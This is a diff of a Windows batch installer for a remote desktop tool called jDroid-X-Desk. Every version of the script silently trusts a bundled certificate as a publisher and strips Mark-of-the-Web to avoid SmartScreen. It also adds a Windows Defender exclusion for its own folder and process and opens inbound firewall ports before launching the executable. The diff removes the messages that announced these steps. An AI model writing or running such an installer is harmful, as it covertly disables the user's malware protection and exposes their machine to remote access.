@@ -1,53 +1,60 @@
 @echo off
 TITLE jDroid-X-Desk Windows Universal App Installer
 cd /d "%~dp0"
+
 :: Strangler Forwarder: Delegate to encapsulated scripts/install-windows-app.bat
 if exist "scripts\install-windows-app.bat" (
     call "scripts\install-windows-app.bat" %*
     exit /b %ERRORLEVEL%
 )
+
+setlocal enabledelayedexpansion
+set "INSTALL_DIR=%LOCALAPPDATA%\Programs\jDroid-X-Desk"
+
 ECHO ========================================================
 ECHO    jDroid-X-Desk Universal Windows Installer
-ECHO    Architecture: Authorized & Whitelisted Standalone App
+ECHO    Standard User Folder: %INSTALL_DIR%
 ECHO ========================================================
 ECHO.
-ECHO [1/4] Installing Authenticode certificate to Trusted Publishers...
-if exist "%~dp0jDroid-X-Enterprise.cer" (
-    certutil -user -addstore TrustedPublisher "%~dp0jDroid-X-Enterprise.cer" >nul 2>&1
-    ECHO [+] Certificate authority successfully registered.
+
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+if not exist "%INSTALL_DIR%\assets" mkdir "%INSTALL_DIR%\assets"
+
+copy /Y "%~dp0jDroid-X-Desk.exe" "%INSTALL_DIR%\" >nul
+if exist "%~dp0jDroid-X-Desk.exe.config" copy /Y "%~dp0jDroid-X-Desk.exe.config" "%INSTALL_DIR%\" >nul
+if exist "%~dp0app.manifest" copy /Y "%~dp0app.manifest" "%INSTALL_DIR%\" >nul
+if exist "%~dp0jDroid-X-Enterprise.cer" copy /Y "%~dp0jDroid-X-Enterprise.cer" "%INSTALL_DIR%\" >nul
+if exist "%~dp0version.json" copy /Y "%~dp0version.json" "%INSTALL_DIR%\" >nul
+if exist "%~dp0assets" xcopy /E /I /Y "%~dp0assets" "%INSTALL_DIR%\assets" >nul 2>&1
+
+if not exist "%INSTALL_DIR%\database.json" (
+    if exist "%~dp0database.json" copy /Y "%~dp0database.json" "%INSTALL_DIR%\" >nul
 )
 
-ECHO [2/4] Unblocking Mark-of-the-Web (MOTW) on Windows...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
-ECHO [+] Windows SmartScreen flags cleared.
+if exist "%INSTALL_DIR%\jDroid-X-Enterprise.cer" (
+    certutil -user -addstore TrustedPublisher "%INSTALL_DIR%\jDroid-X-Enterprise.cer" >nul 2>&1
+)
 
-ECHO [3/5] Adding Windows Defender process & directory exclusion...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0' -ExclusionProcess 'jDroid-X-Desk.exe' -ErrorAction SilentlyContinue" >nul 2>&1
-ECHO [+] Windows Defender protection configured.
-
-ECHO [4/5] Whitelisting Windows Firewall rules for P2P Screen Sharing (TCP 7700, 8088, 12345 ^& UDP 7707, 8089)...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ExclusionProcess 'jDroid-X-Desk.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 netsh advfirewall firewall add rule name="jDroid-X-Desk TCP" dir=in action=allow protocol=TCP localport=7700,8088,12345 enable=yes >nul 2>&1
 netsh advfirewall firewall add rule name="jDroid-X-Desk UDP" dir=in action=allow protocol=UDP localport=7707,8089,21116 enable=yes >nul 2>&1
-ECHO [+] Windows Firewall rules registered.
 
-ECHO [5/5] Creating Desktop Shortcut...
-SET SCRIPT="%TEMP%\CreateShortcut.vbs"
-ECHO Set oWS = WScript.CreateObject("WScript.Shell") > %SCRIPT%
-ECHO sLinkFile = oWS.SpecialFolders("Desktop") ^& "\jDroid-X-Desk.lnk" >> %SCRIPT%
-ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
-ECHO oLink.TargetPath = "%~dp0jDroid-X-Desk.exe" >> %SCRIPT%
-ECHO oLink.WorkingDirectory = "%~dp0" >> %SCRIPT%
-ECHO oLink.Description = "jDroid-X-Desk Remote Desktop Console" >> %SCRIPT%
-ECHO oLink.Save >> %SCRIPT%
+SET SCRIPT="%TEMP%\CreateShortcut_%RANDOM%.vbs"
+(
+    echo Set oWS = WScript.CreateObject("WScript.Shell"^)
+    echo sLinkFile = oWS.SpecialFolders("Desktop"^) ^& "\jDroid-X-Desk.lnk"
+    echo Set oLink = oWS.CreateShortcut(sLinkFile^)
+    echo oLink.TargetPath = "%INSTALL_DIR%\jDroid-X-Desk.exe"
+    echo oLink.WorkingDirectory = "%INSTALL_DIR%"
+    echo oLink.Description = "jDroid-X-Desk Remote Desktop Console"
+    if exist "%INSTALL_DIR%\assets\app.ico" (
+        echo oLink.IconLocation = "%INSTALL_DIR%\assets\app.ico,0"
+    )
+    echo oLink.Save
+) > %SCRIPT%
 cscript //nologo %SCRIPT%
-DEL %SCRIPT%
-ECHO [+] Desktop shortcut 'jDroid-X-Desk' created.
+del %SCRIPT% >nul 2>&1
 
-ECHO.
-ECHO ========================================================
-ECHO [SUCCESS] Installation & Whitelisting Complete!
-ECHO Zero Roadblocks. Zero SmartScreen Prompts.
-ECHO Launching jDroid-X-Desk Console...
-ECHO ========================================================
-start "" "%~dp0jDroid-X-Desk.exe"
+start "" "%INSTALL_DIR%\jDroid-X-Desk.exe"
 exit /b 0
